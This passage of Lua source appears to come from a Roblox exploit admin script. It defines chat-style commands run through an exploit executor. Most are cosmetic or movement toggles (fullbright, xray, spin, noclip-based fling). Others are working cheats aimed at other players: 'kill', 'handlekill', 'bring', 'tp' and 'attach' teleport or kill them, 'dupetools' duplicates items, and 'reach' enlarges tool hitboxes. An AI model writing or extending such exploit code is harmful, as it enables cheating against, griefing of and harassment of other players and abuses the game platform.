	end)

	addcmd('noface',{'removeface'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Decal") and v.Name == 'face' then
				v:Destroy()
			end
		end
	end)

	addcmd('spawnpoint',{'spawn'},function(args, speaker)
		spawnpos = getRoot(speaker.Character).CFrame
		spawnpoint = true
		spDelay = tonumber(args[1]) or 0.1
		notify('Spawn Point','Spawn point created at '..tostring(spawnpos))
	end)

	addcmd('nospawnpoint',{'nospawn','removespawnpoint'},function(args, speaker)
		spawnpoint = false
		notify('Spawn Point','Removed spawn point')
	end)

	addcmd('flashback',{'diedtp'},function(args, speaker)
		if lastDeath ~= nil then
			if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			getRoot(speaker.Character).CFrame = lastDeath
		end
	end)

	addcmd('hatspin',{'spinhats'},function(args, speaker)
		execCmd('unhatspin')
		wait(.5)
		for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
			local keep = Instance.new("BodyPosition") keep.Name = randomString() keep.Parent = v.Handle
			local spin = Instance.new("BodyAngularVelocity") spin.Name = randomString() spin.Parent = v.Handle
			v.Handle:FindFirstChildOfClass("Weld"):Destroy()
			if args[1] then
				spin.AngularVelocity = Vector3.new(0, args[1], 0)
				spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
			else
				spin.AngularVelocity = Vector3.new(0, 100, 0)
				spin.MaxTorque = Vector3.new(0, 200, 0)
			end
			keep.P = 30000
			keep.D = 50
			spinhats = game:GetService('RunService').Stepped:Connect(function()
				pcall(function()
					keep.Position = Players.LocalPlayer.Character.Head.Position
				end)
			end)
		end
	end)

	addcmd('unhatspin',{'unspinhats'},function(args, speaker)
		if spinhats then
			spinhats:Disconnect()
		end
		for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
			v.Parent = workspace
			for i,c in pairs(v.Handle) do
				if c:IsA("BodyPosition") or c:IsA("BodyAngularVelocity") then
					c:Destroy()
				end
			end
			wait()
			v.Parent = speaker.Character
		end
	end)

	addcmd('clearhats',{'cleanhats'},function(args, speaker)
		if firetouchinterest then
			local Player = Players.LocalPlayer
			local Character = Player.Character
			local Old = Character:FindFirstChild("HumanoidRootPart").CFrame
			local Hats = {}
			for _,x in next, workspace:GetChildren() do
				if x:IsA("Accessory") then
					table.insert(Hats,x)
				end
			end
			for _,getacc in next, Character:FindFirstChild("Humanoid"):GetAccessories() do
				getacc:Destroy()
			end
			for i = 1,#Hats do
				repeat game:GetService("RunService").Heartbeat:wait() until Hats[i]
				firetouchinterest(Hats[i].Handle,Character:FindFirstChild("HumanoidRootPart"),0)
				repeat game:GetService("RunService").Heartbeat:wait() until Character:FindFirstChildOfClass("Accessory")
				Character:FindFirstChildOfClass("Accessory"):Destroy()
				repeat game:GetService("RunService").Heartbeat:wait() until not Character:FindFirstChildOfClass("Accessory")
			end
			Character:BreakJoints()
			Player.CharacterAdded:wait()
			for i = 1,20 do game:GetService("RunService").Heartbeat:wait()
				if Player.Character:FindFirstChild("HumanoidRootPart") then
					Player.Character:FindFirstChild("HumanoidRootPart").CFrame = Old
				end
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing firetouchinterest)')
		end
	end)

	addcmd('split',{},function(args, speaker)
		if r15(speaker) then
			speaker.Character.UpperTorso.Waist:Destroy()
		else
			notify('R15 Required','This command requires the r15 rig type')
		end
	end)

	addcmd('nilchar',{},function(args, speaker)
		if speaker.Character ~= nil then
			speaker.Character.Parent = nil
		end
	end)

	addcmd('unnilchar',{'nonilchar'},function(args, speaker)
		if speaker.Character ~= nil then
			speaker.Character.Parent = workspace
		end
	end)

	addcmd('noroot',{'removeroot','rroot'},function(args, speaker)
		if speaker.Character ~= nil then
			local char = Players.LocalPlayer.Character
			char.Parent = nil
			char.HumanoidRootPart:Destroy()
			char.Parent = workspace
		end
	end)

	addcmd('replaceroot',{'replacerootpart'},function(args, speaker)
		if speaker.Character ~= nil and speaker.Character:FindFirstChild("HumanoidRootPart") then
			local Char = speaker.Character
			local OldParent = Char.Parent
			local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
			local OldPos = HRP.CFrame
			Char.Parent = game
			local HRP1 = HRP:Clone()
			HRP1.Parent = Char
			HRP = HRP:Destroy()
			HRP1.CFrame = OldPos
			Char.Parent = OldParent
		end
	end)

	addcmd('clearcharappearance',{'clearchar','clrchar'},function(args, speaker)
		speaker:ClearCharacterAppearance()
	end)

	addcmd('equiptools',{},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
			if v:IsA("Tool") or v:IsA("HopperBin") then
				v.Parent = speaker.Character
			end
		end
	end)

	local function GetHandleTools(p)
		p = p or Players.LocalPlayer
		local r = {}
		for _, v in ipairs(p.Character and p.Character:GetChildren() or {}) do
			if v.IsA(v, "BackpackItem") and v.FindFirstChild(v, "Handle") then
				r[#r + 1] = v
			end
		end
		for _, v in ipairs(p.Backpack:GetChildren()) do
			if v.IsA(v, "BackpackItem") and v.FindFirstChild(v, "Handle") then
				r[#r + 1] = v
			end
		end
		return r
	end
	addcmd('dupetools', {'clonetools'}, function(args, speaker)
		local LOOP_NUM = tonumber(args[1]) or 1
		local OrigPos = speaker.Character.HumanoidRootPart.Position
		local Tools, TempPos = {}, Vector3.new(math.random(-2e5, 2e5), 2e5, math.random(-2e5, 2e5))
		for i = 1, LOOP_NUM do
			local Human = speaker.Character:WaitForChild("Humanoid")
			wait(.1, Human.Parent:MoveTo(TempPos))
			Human.RootPart.Anchored = speaker:ClearCharacterAppearance(wait(.1)) or true
			local t = GetHandleTools(speaker)
			while #t > 0 do
				for _, v in ipairs(t) do
					coroutine.wrap(function()
						for _ = 1, 25 do
							v.Parent = speaker.Character
							v.Handle.Anchored = true
						end
						for _ = 1, 5 do
							v.Parent = workspace
						end
						table.insert(Tools, v.Handle)
					end)()
				end
				t = GetHandleTools(speaker)
			end
			wait(.1)
			speaker.Character = speaker.Character:Destroy()
			speaker.CharacterAdded:Wait():WaitForChild("Humanoid").Parent:MoveTo(LOOP_NUM == i and OrigPos or TempPos, wait(.1))
			if i == LOOP_NUM or i % 5 == 0 then
				local HRP = speaker.Character.HumanoidRootPart
				if type(firetouchinterest) == "function" then
					for _, v in ipairs(Tools) do
						v.Anchored = not firetouchinterest(v, HRP, 1, firetouchinterest(v, HRP, 0)) and false or false
					end
				else
					for _, v in ipairs(Tools) do
						coroutine.wrap(function()
							local x = v.CanCollide
							v.CanCollide = false
							v.Anchored = false
							for _ = 1, 10 do
								v.CFrame = HRP.CFrame
								wait()
							end
							v.CanCollide = x
						end)()
					end
				end
				wait(.1)
				Tools = {}
			end
			TempPos = TempPos + Vector3.new(10, math.random(-5, 5), 0)
		end
	end)

	addcmd('touchinterests', {'touchinterest', 'firetouchinterests', 'firetouchinterest'}, function(args, speaker)
		local Root = getRoot(speaker.Character) or speaker.Character:FindFirstChildWhichIsA("BasePart")
		local function Touch(x)
			x = x.FindFirstAncestorWhichIsA(x, "Part")
			if x then
				if firetouchinterest then
					return spawn(function()
						firetouchinterest(x, Root, 1, wait() and firetouchinterest(x, Root, 0))
					end)
				end
				x.CFrame = Root.CFrame
			end
		end
		for _, v in ipairs(workspace:GetDescendants()) do
			if v.IsA(v, "TouchTransmitter") then
				Touch(v)
			end
		end
	end)

	addcmd('fullbright',{'fb','fullbrightness'},function(args, speaker)
		game:GetService("Lighting").Brightness = 2
		game:GetService("Lighting").ClockTime = 14
		game:GetService("Lighting").FogEnd = 100000
		game:GetService("Lighting").GlobalShadows = false
		game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
	end)

	addcmd('loopfullbright',{'loopfb'},function(args, speaker)
		if brightLoop then
			brightLoop:Disconnect()
		end
		local function brightFunc()
			game:GetService("Lighting").Brightness = 2
			game:GetService("Lighting").ClockTime = 14
			game:GetService("Lighting").FogEnd = 100000
			game:GetService("Lighting").GlobalShadows = false
			game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		end

		brightLoop = game:GetService("RunService").RenderStepped:Connect(brightFunc)
	end)

	addcmd('unloopfullbright',{'unloopfb'},function(args, speaker)
		if brightLoop then
			brightLoop:Disconnect()
		end
	end)

	addcmd('ambient',{},function(args, speaker)
		game:GetService("Lighting").Ambient = Color3.new(args[1],args[2],args[3])
		game:GetService("Lighting").OutdoorAmbient = Color3.new(args[1],args[2],args[3])
	end)

	addcmd('day',{},function(args, speaker)
		game:GetService("Lighting").ClockTime = 14
	end)

	addcmd('night',{},function(args, speaker)
		game:GetService("Lighting").ClockTime = 0
	end)

	addcmd('nofog',{},function(args, speaker)
		game:GetService("Lighting").FogEnd = 100000
	end)

	addcmd('brightness',{},function(args, speaker)
		game:GetService("Lighting").Brightness = args[1]
	end)

	addcmd('globalshadows',{'gshadows'},function(args, speaker)
		game:GetService("Lighting").GlobalShadows = true
	end)

	addcmd('unglobalshadows',{'nogshadows','ungshadows','noglobalshadows'},function(args, speaker)
		game:GetService("Lighting").GlobalShadows = false
	end)

	origsettings = {abt = game:GetService("Lighting").Ambient, oabt = game:GetService("Lighting").OutdoorAmbient, brt = game:GetService("Lighting").Brightness, time = game:GetService("Lighting").ClockTime, fe = game:GetService("Lighting").FogEnd, fs = game:GetService("Lighting").FogStart, gs = game:GetService("Lighting").GlobalShadows}

	addcmd('restorelighting',{'rlighting'},function(args, speaker)
		game:GetService("Lighting").Ambient = origsettings.abt
		game:GetService("Lighting").OutdoorAmbient = origsettings.oabt
		game:GetService("Lighting").Brightness = origsettings.brt
		game:GetService("Lighting").ClockTime = origsettings.time
		game:GetService("Lighting").FogEnd = origsettings.fe
		game:GetService("Lighting").FogStart = origsettings.fs
		game:GetService("Lighting").GlobalShadows = origsettings.gs
	end)

	addcmd('stun',{'platformstand'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
	end)

	addcmd('unstun',{'nostun','unplatformstand','noplatformstand'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	end)

	addcmd('norotate',{'noautorotate'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').AutoRotate  = false
	end)

	addcmd('unnorotate',{'autorotate'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').AutoRotate  = true
	end)

	addcmd('enablestate',{},function(args, speaker)
		local x = args[1]
		if not tonumber(x) then
			local x = Enum.HumanoidStateType[args[1]]
		end
		speaker.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(x, true)
	end)

	addcmd('disablestate',{},function(args, speaker)
		local x = args[1]
		if not tonumber(x) then
			local x = Enum.HumanoidStateType[args[1]]
		end
		speaker.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(x, false)
	end)

	addcmd('drophats',{'drophat'},function(args, speaker)
		if speaker.Character then
			for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
				v.Parent = workspace
			end
		end
	end)

	addcmd('deletehats',{'nohats','rhats'},function(args, speaker)
		if speaker.Character then
			speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
		end
	end)

	addcmd('droptools',{'droptool'},function(args, speaker)
		for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
			if v:IsA("Tool") then
				v.Parent = Players.LocalPlayer.Character
			end
		end
		wait()
		for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("Tool") then
				v.Parent = workspace
			end
		end
	end)

	addcmd('droppabletools',{},function(args, speaker)
		if speaker.Character then
			for _,obj in pairs(speaker.Character:GetChildren()) do
				if obj:IsA("Tool") then
					obj.CanBeDropped = true
				end
			end
		end
		if speaker:FindFirstChildOfClass("Backpack") then
			for _,obj in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
				if obj:IsA("Tool") then
					obj.CanBeDropped = true
				end
			end
		end
	end)

	local currentToolSize = ""
	local currentGripPos = ""
	addcmd('reach',{},function(args, speaker)
		execCmd('unreach')
		wait()
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Tool") then
				if args[1] then
					currentToolSize = v.Handle.Size
					currentGripPos = v.GripPos
					local a = Instance.new("SelectionBox")
					a.Name = "SelectionBoxCreated"
					a.Parent = v.Handle
					a.Adornee = v.Handle
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(0.5,0.5,args[1])
					v.GripPos = Vector3.new(0,0,0)
					speaker.Character.Humanoid:UnequipTools()
				else
					currentToolSize = v.Handle.Size
					currentGripPos = v.GripPos
					local a = Instance.new("SelectionBox")
					a.Name = "SelectionBoxCreated"
					a.Parent = v.Handle
					a.Adornee = v.Handle
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(0.5,0.5,60)
					v.GripPos = Vector3.new(0,0,0)
					speaker.Character.Humanoid:UnequipTools()
				end
			end
		end
	end)

	addcmd('unreach',{'noreach'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Handle.Size = currentToolSize
				v.GripPos = currentGripPos
				v.Handle.SelectionBoxCreated:Destroy()
			end
		end
	end)

	addcmd('grippos',{},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Parent = speaker:FindFirstChildOfClass("Backpack")
				v.GripPos = Vector3.new(args[1],args[2],args[3])
				v.Parent = speaker.Character
			end
		end
	end)

	addcmd('usetools', {}, function(args, speaker)
		local Backpack = speaker:FindFirstChildOfClass("Backpack")
		local ammount = tonumber(args[1]) or 1
		local delay_ = tonumber(args[2]) or false
		for _, v in ipairs(Backpack:GetChildren()) do
			v.Parent = speaker.Character
			coroutine.wrap(function()
				for _ = 1, ammount do
					v:Activate()
					if delay_ then
						wait(delay_)
					end
				end
				v.Parent = Backpack
			end)()
		end
	end)

	addcmd('logs',{},function(args, speaker)
		logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
	end)

	addcmd('chatlogs',{'clogs'},function(args, speaker)
		join.Visible = false
		chat.Visible = true
		table.remove(shade3,table.find(shade3,selectChat))
		table.remove(shade2,table.find(shade2,selectJoin))
		table.insert(shade2,selectChat)
		table.insert(shade3,selectJoin)
		selectJoin.BackgroundColor3 = currentShade3
		selectChat.BackgroundColor3 = currentShade2
		logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
	end)

	addcmd('joinlogs',{'jlogs'},function(args, speaker)
		chat.Visible = false
		join.Visible = true	
		table.remove(shade3,table.find(shade3,selectJoin))
		table.remove(shade2,table.find(shade2,selectChat))
		table.insert(shade2,selectJoin)
		table.insert(shade3,selectChat)
		selectChat.BackgroundColor3 = currentShade3
		selectJoin.BackgroundColor3 = currentShade2
		logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
	end)

	flinging = false
	addcmd('fling',{},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child:IsA("BasePart") then
				child.CustomPhysicalProperties = PhysicalProperties.new(2, 0.3, 0.5)
			end
		end
		execCmd('noclip nonotify')
		wait(.1)
		local bambam = Instance.new("BodyAngularVelocity")
		bambam.Name = randomString()
		bambam.Parent = getRoot(speaker.Character)
		bambam.AngularVelocity = Vector3.new(0,311111,0)
		bambam.MaxTorque = Vector3.new(0,311111,0)
		bambam.P = math.huge
		local function PauseFling()
			if speaker.Character:FindFirstChildOfClass("Humanoid") then
				if speaker.Character:FindFirstChildOfClass("Humanoid").FloorMaterial == Enum.Material.Air then
					bambam.AngularVelocity = Vector3.new(0,0,0)
				else
					bambam.AngularVelocity = Vector3.new(0,311111,0)
				end
			end
		end
		if TouchingFloor then
			TouchingFloor:Disconnect()
		end
		if TouchingFloorReset then
			TouchingFloorReset:Disconnect()
		end
		TouchingFloor = speaker.Character:FindFirstChildOfClass("Humanoid"):GetPropertyChangedSignal("FloorMaterial"):Connect(PauseFling)
		flinging = true
		local function flingDied()
			execCmd('unfling')
		end
		TouchingFloorReset = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(flingDied)
	end)

	addcmd('unfling',{'nofling'},function(args, speaker)
		execCmd('clip nonotify')
		if TouchingFloor then
			TouchingFloor:Disconnect()
		end
		if TouchingFloorReset then
			TouchingFloorReset:Disconnect()
		end
		flinging = false
		wait(.1)
		local speakerChar = speaker.Character
		if not speakerChar or not getRoot(speakerChar) then return end
		for i,v in pairs(getRoot(speakerChar):GetChildren()) do
			if v.ClassName == 'BodyAngularVelocity' then
				v:Destroy()
			end
		end
		for _, child in pairs(speakerChar:GetDescendants()) do
			if child.ClassName == "Part" or child.ClassName == "MeshPart" then
				child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
			end
		end
	end)

	addcmd('togglefling',{},function(args, speaker)
		if flinging then
			execCmd('unfling')
		else
			execCmd('fling')
		end
	end)

	addcmd('invisfling',{},function(args, speaker)
		local ch = speaker.Character
		local prt=Instance.new("Model")
		prt.Parent = speaker.Character
		local z1 = Instance.new("Part")
		z1.Name="Torso"
		z1.CanCollide = false
		z1.Anchored = true
		local z2 = Instance.new("Part")
		z2.Name="Head"
		z2.Parent = prt
		z2.Anchored = true
		z2.CanCollide = false
		local z3 =Instance.new("Humanoid")
		z3.Name="Humanoid"
		z3.Parent = prt
		z1.Position = Vector3.new(0,9999,0)
		speaker.Character=prt
		wait(3)
		speaker.Character=ch
		wait(3)
		local Hum = Instance.new("Humanoid")
		z2:Clone()
		Hum.Parent = speaker.Character
		local root =  getRoot(speaker.Character)
		for i,v in pairs(speaker.Character:GetChildren()) do
			if v ~= root and  v.Name ~= "Humanoid" then
				v:Destroy()
			end
		end
		root.Transparency = 0
		root.Color = Color3.new(1, 1, 1)
		local invisflingStepped
		invisflingStepped = game:GetService('RunService').Stepped:Connect(function()
			if speaker.Character and getRoot(speaker.Character) then
				getRoot(speaker.Character).CanCollide = false
			else
				invisflingStepped:Disconnect()
			end
		end)
		sFLY()
		workspace.CurrentCamera.CameraSubject = root
		local bambam = Instance.new("BodyThrust")
		bambam.Parent = getRoot(speaker.Character)
		bambam.Force = Vector3.new(99999,99999*10,99999)
		bambam.Location = getRoot(speaker.Character).Position
	end)

	function attach(speaker,target)
		if tools(speaker) then
			local char = speaker.Character
			local tchar = target.Character
			local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
			local hrp = getRoot(speaker.Character)
			local hrp2 = getRoot(target.Character)
			hum.Name = "1"
			local newHum = hum:Clone()
			newHum.Parent = char
			newHum.Name = "Humanoid"
			wait()
			hum:Destroy()
			workspace.CurrentCamera.CameraSubject = char
			newHum.DisplayDistanceType = "None"
			local tool = speaker:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or speaker.Character:FindFirstChildOfClass("Tool")
			tool.Parent = char
			hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-100, 100)/200,math.random(-100, 100)/200,math.random(-100, 100)/200)
			local n = 0
			repeat
				wait(.1)
				n = n + 1
				hrp.CFrame = hrp2.CFrame
			until (tool.Parent ~= char or not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250) and n > 2
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('attach',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			attach(speaker,Players[v])
		end
	end)

	function kill(speaker,target,fast)
		if tools(speaker) then
			if target ~= nil then
				local NormPos = getRoot(speaker.Character).CFrame
				if not fast then
					refresh(speaker)
					wait()
					repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
					wait(0.3)
				end
				local hrp = getRoot(speaker.Character)
				attach(speaker,target)
				repeat
					wait()
					hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5,999999)
				until not getRoot(target.Character) or not getRoot(speaker.Character)
				wait(1)
				speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
			end
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('kill',{'fekill'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			kill(speaker,Players[v])
		end
	end)

	addcmd('handlekill', {'hkill'}, function(args, speaker)
		if not firetouchinterest then
			return notify('Incompatible Exploit', 'Your exploit does not support this command (missing firetouchinterest)')
		end
		local RS = game:GetService("RunService").RenderStepped
		local Tool = speaker.Character.FindFirstChildWhichIsA(speaker.Character, "Tool")
		local Handle = Tool and Tool.FindFirstChild(Tool, "Handle")
		if not Tool or not Handle then
			return notify("Handle Kill", "You need to hold a \"Tool\" that does damage on touch. For example the default \"Sword\" tool.")
		end
		for _, v in ipairs(getPlayer(args[1], speaker)) do
			v = Players[v]
			spawn(function()
				while Tool and speaker.Character and v.Character and Tool.Parent == speaker.Character do
					local Human = v.Character.FindFirstChildWhichIsA(v.Character, "Humanoid")
					if not Human or Human.Health <= 0 then
						break
					end
					for _, v1 in ipairs(v.Character.GetChildren(v.Character)) do
						v1 = ((v1.IsA(v1, "BasePart") and firetouchinterest(Handle, v1, 1, (RS.Wait(RS) and nil) or firetouchinterest(Handle, v1, 0)) and nil) or v1) or v1
					end
				end
				notify("Handle Kill Stopped!", v.Name .. " died/left or you unequiped the tool!")
			end)
		end
	end)

	local hb = game:GetService("RunService").Heartbeat
	addcmd('tpwalk', {'teleportwalk'}, function(args, speaker)
		tpwalking = true
		local chr = speaker.Character
		local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
		while tpwalking and hb:Wait() and chr and hum and hum.Parent do
			if hum.MoveDirection.Magnitude > 0 then
				chr:TranslateBy(hum.MoveDirection)
			end
		end
	end)
	addcmd('untpwalk', {'unteleportwalk'}, function(args, speaker)
		tpwalking = false
	end)

	addcmd('fastkill',{'fastfekill'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			kill(speaker,Players[v],true)
		end
	end)

	function bring(speaker,target,fast)
		if tools(speaker) then
			if target ~= nil then
				local NormPos = getRoot(speaker.Character).CFrame
				if not fast then
					refresh(speaker)
					wait()
					repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
					wait(0.3)
				end
				local hrp = getRoot(speaker.Character)
				attach(speaker,target)
				repeat
					wait()
					hrp.CFrame = NormPos
				until not getRoot(target.Character) or not getRoot(speaker.Character)
				wait(1)
				speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
			end
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('bring',{'febring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			bring(speaker,Players[v])
		end
	end)

	addcmd('fastbring',{'fastfebring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			bring(speaker,Players[v],true)
		end
	end)

	function teleport(speaker,target,target2,fast)
		if tools(speaker) then
			if target ~= nil then
				local NormPos = getRoot(speaker.Character).CFrame
				if not fast then
					refresh(speaker)
					wait()
					repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
					wait(0.3)
				end
				local hrp = getRoot(speaker.Character)
				local hrp2 = getRoot(target2.Character)
				attach(speaker,target)
				repeat
					wait()
					hrp.CFrame = hrp2.CFrame
				until not getRoot(target.Character) or not getRoot(speaker.Character)
				wait(1)
				speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
			end
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('tp',{'teleport'},function(args, speaker)
		local players1=getPlayer(args[1], speaker)
		local players2=getPlayer(args[2], speaker)
		for i,v in pairs(players1)do
			if getRoot(Players[v].Character) and getRoot(Players[players2[1]].Character) then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				teleport(speaker,Players[v],Players[players2[1]])
			end
		end
	end)

	addcmd('fasttp',{'fastteleport'},function(args, speaker)
		local players1=getPlayer(args[1], speaker)
		local players2=getPlayer(args[2], speaker)
		for i,v in pairs(players1)do
			if getRoot(Players[v].Character) and getRoot(Players[players2[1]].Character) then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				teleport(speaker,Players[v],Players[players2[1]],true)
			end
		end
	end)

	addcmd('spin',{},function(args, speaker)
		local spinSpeed = 20
		if args[1] and isNumber(args[1]) then
			spinSpeed = args[1]
		end
		for i,v in pairs(getRoot(speaker.Character):GetChildren()) do
			if v.Name == "Spinning" then
				v:Destroy()
			end
		end
		local Spin = Instance.new("BodyAngularVelocity")
		Spin.Name = "Spinning"
		Spin.Parent = getRoot(speaker.Character)
		Spin.MaxTorque = Vector3.new(0, math.huge, 0)
		Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
	end)

	addcmd('unspin',{},function(args, speaker)
		for i,v in pairs(getRoot(speaker.Character):GetChildren()) do
			if v.Name == "Spinning" then
				v:Destroy()
			end
		end
	end)

	local transparent = false
	function x(v)
		if v then
			for _,i in pairs(workspace:GetDescendants()) do
				if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
					i.LocalTransparencyModifier = 0.5
				end
			end
		else
			for _,i in pairs(workspace:GetDescendants()) do
				if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
					i.LocalTransparencyModifier = 0
				end
			end
		end
	end

	addcmd('xray',{},function(args, speaker)
		transparent = true
		x(transparent)
	end)

	addcmd('unxray',{'noxray'},function(args, speaker)
		transparent = false
		x(transparent)
	end)

	addcmd('togglexray',{},function(args, speaker)
		transparent=not transparent
		x(transparent)
	end)

	local walltpTouch = nil
	addcmd('walltp',{},function(args, speaker)
		local torso
		if r15(speaker) then
			torso = speaker.Character.UpperTorso
		else
			torso = speaker.Character.Torso
		end
		local function touchedFunc(hit)
			local Root = getRoot(speaker.Character)
			if hit:IsA("BasePart") and hit.Position.Y > Root.Position.Y - speaker.Character.Humanoid.HipHeight then
				local hitP = getRoot(hit.Parent)
				if hitP ~= nil then
					Root.CFrame = hit.CFrame * CFrame.new(Root.CFrame.lookVector.X,hitP.Size.Z/2 + speaker.Character.Humanoid.HipHeight,Root.CFrame.lookVector.Z)
				elseif hitP == nil then
					Root.CFrame = hit.CFrame * CFrame.new(Root.CFrame.lookVector.X,hit.Size.Y/2 + speaker.Character.Humanoid.HipHeight,Root.CFrame.lookVector.Z)
				end
			end
		end
		walltpTouch = torso.Touched:Connect(touchedFunc)
	end)

	addcmd('unwalltp',{'nowalltp'},function(args, speaker)
		if walltpTouch then
			walltpTouch:Disconnect()
		end
	end)

	autoclicking = false
	addcmd('autoclick',{},function(args, speaker)
		if mouse1press and mouse1release then
			execCmd('unautoclick')
			wait()
			local clickDelay = 0.1
			local releaseDelay = 0.1
			if args[1] and isNumber(args[1]) then clickDelay = args[1] end
			if args[2] and isNumber(args[2]) then releaseDelay = args[2] end
			autoclicking = true
			cancelAutoClick = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
				if not gameProcessedEvent then
					if (input.KeyCode == Enum.KeyCode.Backspace and UserInputService:IsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputService:IsKeyDown(Enum.KeyCode.Backspace)) then
						autoclicking = false
						cancelAutoClick:Disconnect()
					end
				end
			end)
			notify('Auto Clicker',"Press [backspace] and [=] at the same time to stop")
			repeat wait(clickDelay)
				mouse1press()
				wait(releaseDelay)
				mouse1release()
			until autoclicking == false
		else
			notify('Auto Clicker',"Your exploit doesn't have the ability to use the autoclick")
		end
	end)

	addcmd('unautoclick',{'noautoclick'},function(args, speaker)
		autoclicking = false
		if cancelAutoClick then cancelAutoClick:Disconnect() end
	end)

	addcmd('mousesensitivity',{'ms'},function(args, speaker)
		UserInputService.MouseDeltaSensitivity = args[1]
	end)

	local nameBox = nil
	local nbSelection = nil
	addcmd('hovername',{},function(args, speaker)
		execCmd('unhovername')
		wait()
		nameBox = Instance.new("TextLabel")
		nameBox.Name = randomString()
		nameBox.Parent = PARENT
		nameBox.BackgroundTransparency = 1
		nameBox.Size = UDim2.new(0,200,0,30)
		nameBox.Font = Enum.Font.Code
		nameBox.TextSize = 16
		nameBox.Text = ""
		nameBox.TextColor3 = Color3.new(1, 1, 1)
		nameBox.TextStrokeTransparency = 0
		nameBox.TextXAlignment = Enum.TextXAlignment.Left
		nameBox.ZIndex = 10
		nbSelection = Instance.new('SelectionBox')
		nbSelection.Name = randomString()
		nbSelection.LineThickness = 0.03
		nbSelection.Color3 = Color3.new(1, 1, 1)
		local function updateNameBox()
			local t
			local target = IYMouse.Target

			if target then
				local humanoid = target.Parent:FindFirstChild('Humanoid') or target.Parent.Parent:FindFirstChild('Humanoid')
				if humanoid then
					t = humanoid.Parent
				end
			end

			if t ~= nil then
				local x = IYMouse.X
				local y = IYMouse.Y
				local xP
				local yP
				if IYMouse.X > 200 then
					xP = x - 205
					nameBox.TextXAlignment = Enum.TextXAlignment.Right
				else
					xP = x + 25
					nameBox.TextXAlignment = Enum.TextXAlignment.Left
				end
				nameBox.Position = UDim2.new(0, xP, 0, y)
				nameBox.Text = t.Name
				nameBox.Visible = true
				nbSelection.Parent = t
				nbSelection.Adornee = t
